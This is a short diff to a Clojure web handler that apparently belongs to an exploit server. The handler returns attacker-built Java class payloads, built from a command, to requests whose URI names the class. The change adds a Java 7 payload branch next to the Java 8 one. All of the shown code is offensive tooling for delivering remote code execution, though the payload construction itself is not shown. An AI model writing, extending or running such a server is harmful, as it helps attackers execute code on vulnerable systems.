@@ -13,8 +13,7 @@
         payload-8 (Payload/build command ClassFile/JAVA_8 class-name8)]
    (fn [request]
     (println "[+] incoming request " (:uri request))
-    (if (str/includes? (:uri request) class-name8)
-      {:status 200
-       :body payload-8}
-      {:status 200
-       :body "sup"}))))
+    (cond 
+      (str/includes? (:uri request) class-name8) {:status 200 :body payload-8}
+      (str/includes? (:uri request) class-name7) {:status 200 :body payload-7}
+      :else {:status 200 :body "not implemented!"}))))
